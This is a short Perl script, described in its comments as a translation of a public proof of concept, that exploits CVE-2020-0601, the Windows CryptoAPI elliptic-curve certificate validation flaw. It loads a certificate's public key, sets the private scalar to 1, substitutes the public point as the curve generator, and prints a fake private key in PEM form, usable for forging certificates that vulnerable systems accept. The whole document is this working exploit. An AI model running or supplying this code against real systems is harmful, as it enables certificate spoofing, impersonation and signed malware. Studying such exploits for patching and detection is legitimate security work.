#!/usr/bin/perl

# Convert public key to a fake private key, to exploit CVE-2020-0601
# This is a PERL translation of https://github.com/ollypwn/CVE-2020-0601/main.rb

use strict;
use warnings;

use Crypt::OpenSSL::X509;
use Crypt::PK::ECC;

die "Usage: pub2fpriv.pl CERTFILE" if @ARGV != 1;

my $x509 = Crypt::OpenSSL::X509->new_from_file($ARGV[0]);
my $hkey = Crypt::PK::ECC->new(\$x509->pubkey())->key2hash();

$hkey->{k} = ('0' x (length($hkey->{pub_x}) - 1)) . '1';
$hkey->{"curve_G$_"} = $hkey->{"pub_$_"} for qw(x y);

# See ECC.pm code (search 'no curve') to understand the hack below
$hkey->{$_} = $hkey->{"curve_$_"} for qw(prime A B order Gx Gy cofactor);
$hkey->{curve_name} = $hkey;

print Crypt::PK::ECC->new($hkey)->export_key_pem('private');

